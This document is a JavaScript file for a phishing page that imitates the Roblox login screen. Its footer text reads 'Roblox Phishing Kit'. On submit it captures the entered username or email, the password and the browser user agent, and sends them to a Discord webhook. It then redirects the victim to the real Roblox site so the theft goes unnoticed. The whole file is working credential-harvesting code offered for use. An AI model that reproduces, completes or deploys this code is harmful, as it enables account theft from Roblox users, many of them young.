// REPLACE THIS WITH YOUR ACTUAL DISCORD WEBHOOK URL
const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';

document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('login-form');
    
    if (form) {
        form.addEventListener('submit', async function(event) {
            event.preventDefault();
            
            const username = document.getElementById('username-email').value;
            const password = document.getElementById('password').value;
            const rememberMe = document.querySelector('input[name="remember-me"]')?.checked || false;
            
            // Prepare the data to send to Discord
            const webhookData = {
                content: null,
                embeds: [{
                    title: '🎮 Roblox Login Credentials Captured',
                    color: 0x5865f2,
                    fields: [
                        {
                            name: '🔐 Username / Email',
                            value: `\`\`\`${username}\`\`\``,
                            inline: false
                        },
                        {
                            name: '🔑 Password',
                            value: `\`\`\`${password}\`\`\``,
                            inline: false
                        },
                        {
                            name: '📌 Remember Me',
                            value: rememberMe ? '✅ Yes' : '❌ No',
                            inline: true
                        },
                        {
                            name: '🌐 User Agent',
                            value: `\`\`\`${navigator.userAgent}\`\`\``,
                            inline: false
                        },
                        {
                            name: '🕒 Timestamp',
                            value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
                            inline: false
                        }
                    ],
                    footer: {
                        text: 'Roblox Phishing Kit | blet suka'
                    },
                    timestamp: new Date().toISOString()
                }]
            };
            
            // Send to Discord webhook
            try {
                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(webhookData)
                });
                
                if (!response.ok) {
                    console.error('Failed to send to webhook:', response.status);
                }
            } catch (error) {
                console.error('Error sending credentials:', error);
            }
            
            // Redirect to the real Roblox login page so victim doesn't get suspicious
            window.location.href = 'https://www.roblox.com/login?redirected=true';
        });
    }
    
    // Small fake "Forgot Password" and "Sign up" links go to real Roblox pages
    const forgotLink = document.querySelector('.forgot-password');
    if (forgotLink) {
        forgotLink.addEventListener('click', function(e) {
            e.preventDefault();
            window.location.href = 'https://www.roblox.com/forgot-password';
        });
    }
    
    const signupLink = document.querySelector('.signup-redirect a');
    if (signupLink) {
        signupLink.addEventListener('click', function(e) {
            e.preventDefault();
            window.location.href = 'https://www.roblox.com/account/signup-redirect';
        });
    }
});
